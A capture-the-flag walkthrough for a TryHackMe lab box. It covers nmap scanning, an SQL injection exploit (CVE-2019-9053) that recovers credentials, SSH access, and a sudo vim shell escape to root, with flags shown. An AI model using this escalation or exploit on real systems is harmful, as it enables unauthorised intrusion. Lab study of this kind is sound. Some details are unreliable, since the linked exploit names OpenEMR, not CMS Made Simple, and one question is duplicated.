@@ -1,0 +1,151 @@
+root@natzsec:~/Desktop/tryhackme/boxes/simple_ctf# nmap -Pn -sC -sV -oA nmap/initial 10.10.154.48
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 09:44 IST
+Nmap scan report for 10.10.154.48
+Host is up (0.34s latency).
+Not shown: 999 filtered ports
+PORT     STATE SERVICE VERSION
+2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
+|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
+|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 141.70 seconds
+root@natzsec:~/Desktop/tryhackme/boxes/simple_ctf# nmap -p- -Pn -sC -sV -oA nmap/initial 10.10.154.48
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 09:48 IST
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.05% done
+Stats: 0:00:08 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.16% done
+
+root@natzsec:~/Desktop/tryhackme/boxes/simple_ctf# nmap -p- -Pn 10.10.154.48
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 09:49 IST
+Stats: 0:00:04 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.03% done
+Stats: 0:00:05 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.06% done
+Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 0.09% done
+
+root@natzsec:~/Desktop/tryhackme/boxes/simple_ctf# nmap -p- 10.10.154.48
+Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-11 09:49 IST
+Stats: 0:00:49 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 9.67% done; ETC: 09:57 (0:07:38 remaining)
+Stats: 0:00:50 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
+SYN Stealth Scan Timing: About 10.25% done; ETC: 09:57 (0:07:27 remaining)
+Nmap scan report for 10.10.154.48
+Host is up (0.21s latency).
+Not shown: 65532 filtered ports
+PORT     STATE SERVICE
+21/tcp   open  ftp
+80/tcp   open  http
+2222/tcp open  EtherNetIP-1
+
+Nmap done: 1 IP address (1 host up) scanned in 305.10 seconds
+root@natzsec:~/Desktop/tryhackme/boxes/simple_ctf# 
+
+Initial scan did not show any low ports so I re-sanned it and found 80 and 21 are open.
+
+Ran the gobuster and found that the CMS of the website is CMS made simple
+
+#1 How many services are running under port 1000?
+
+2
+
+#2 What is running on the higher port?
+
+ssh
+
+#3 What's the CVE you're using against the application? 
+
+CVE-2019-9053
+
+#4 To what kind of vulnerability is the application vulnerable?
+
+sqli
+
+Since CMS made simple is having a public exploit, I have used this exploit to get the username and password.
+
+https://packetstormsecurity.com/files/148838/OpenEMR-5.0.1.3-Remote-Code-Execution.html
+
+#5 What's the password?
+secret
+
+[+] Salt for password found: 1dac0d92e9fa6bb2
+[+] Username found: mitch
+[+] Email found: admin@admin.com
+[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
+
+#6 Where can you login with the details obtained?
+
+ssh
+
+ssh is running on the port 2222
+
+#7 Where can you login with the details obtained?
+
+$ ls -la
+total 36
+drwxr-x--- 3 mitch mitch 4096 aug 19  2019 .
+drwxr-xr-x 4 root  root  4096 aug 17  2019 ..
+-rw------- 1 mitch mitch  178 aug 17  2019 .bash_history
+-rw-r--r-- 1 mitch mitch  220 sep  1  2015 .bash_logout
+-rw-r--r-- 1 mitch mitch 3771 sep  1  2015 .bashrc
+drwx------ 2 mitch mitch 4096 aug 19  2019 .cache
+-rw-r--r-- 1 mitch mitch  655 mai 16  2017 .profile
+-rw-rw-r-- 1 mitch mitch   19 aug 17  2019 user.txt
+-rw------- 1 mitch mitch  515 aug 17  2019 .viminfo
+$ cat user.txt	
+G00d j0b, keep up!
+
+User flag: G00d j0b, keep up!
+
+#8 Is there any other user in the home directory? What's its name?
+
+sunbath
+
+What can you leverage to spawn a privileged shell?
+
+vim 
+
+as per the linpeas script it shows we can execute the vim as sudo without password.
+
+[i] https://book.hacktricks.xyz/linux-unix/privilege-escalation#commands-with-sudo-and-suid-commands
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+mitch@Machine:/tmp$ sudo -l
+User mitch may run the following commands on Machine:
+    (root) NOPASSWD: /usr/bin/vim
+
+If we goto gtfobins we can find the way to spawn the shell.
+
+open VIm editor.
+
+:set shell=/bin/bash
+:shell
+
+
+mitch@Machine:/tmp$ sudo /usr/bin/vim
+
+root@Machine:/tmp# id
+uid=0(root) gid=0(root) groups=0(root)
+root@Machine:/tmp# hostname
+Machine
+root@Machine:/tmp# cd /root/
+root@Machine:/root# ls -la
+total 28
+drwx------  4 root root 4096 aug 17  2019 .
+drwxr-xr-x 23 root root 4096 aug 19  2019 ..
+-rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
+drwx------  2 root root 4096 aug 17  2019 .cache
+drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
+-rw-r--r--  1 root root  148 aug 17  2015 .profile
+-rw-r--r--  1 root root   24 aug 17  2019 root.txt
+root@Machine:/root# cat root.txt 
+W3ll d0n3. You made it!
+
+#10 What's the root flag?
+W3ll d0n3. You made it!
